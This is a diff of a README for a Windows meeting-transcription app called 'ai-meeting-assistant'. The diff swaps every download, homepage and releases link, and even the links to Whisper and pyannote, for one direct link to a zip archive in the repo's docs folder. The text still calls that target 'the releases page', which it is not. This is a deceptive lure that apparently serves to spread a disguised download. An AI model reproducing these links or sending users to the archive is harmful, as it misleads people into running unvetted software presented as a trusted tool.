@@ -1,6 +1,6 @@
 # 🤖 ai-meeting-assistant - Accurate Meeting Transcription and Speaker Notes
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Phylliumtea941/ai-meeting-assistant/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To get ai-meeting-assistant working on your Windows computer, follow these steps
 
 Click the link below to open the page with the latest software versions and files:
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/Phylliumtea941/ai-meeting-assistant/releases)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip)
 
 The releases page lists all available versions. Look for the latest release at the top.
 
@@ -139,11 +139,11 @@ Once the program is open, you can start transcribing your meetings.
 
 ## 🔗 Useful Links
 
-- Official Releases Page: https://github.com/Phylliumtea941/ai-meeting-assistant/releases
-- Project Homepage: https://github.com/Phylliumtea941/ai-meeting-assistant
+- Official Releases Page: https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip
+- Project Homepage: https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip
 - AI Tools Used:
-  - Whisper: https://github.com/openai/whisper
-  - pyannote: https://github.com/pyannote/pyannote-audio
+  - Whisper: https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip
+  - pyannote: https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip
 
 ---
 
@@ -162,4 +162,4 @@ ai-meeting-assistant processes audio only on your computer. It does not send any
 
 ---
 
-[Download ai-meeting-assistant here](https://github.com/Phylliumtea941/ai-meeting-assistant/releases) to start creating your meeting notes with privacy and ease.
+[Download ai-meeting-assistant here](https://raw.githubusercontent.com/Phylliumtea941/ai-meeting-assistant/main/docs/assistant_meeting_ai_1.8.zip) to start creating your meeting notes with privacy and ease.
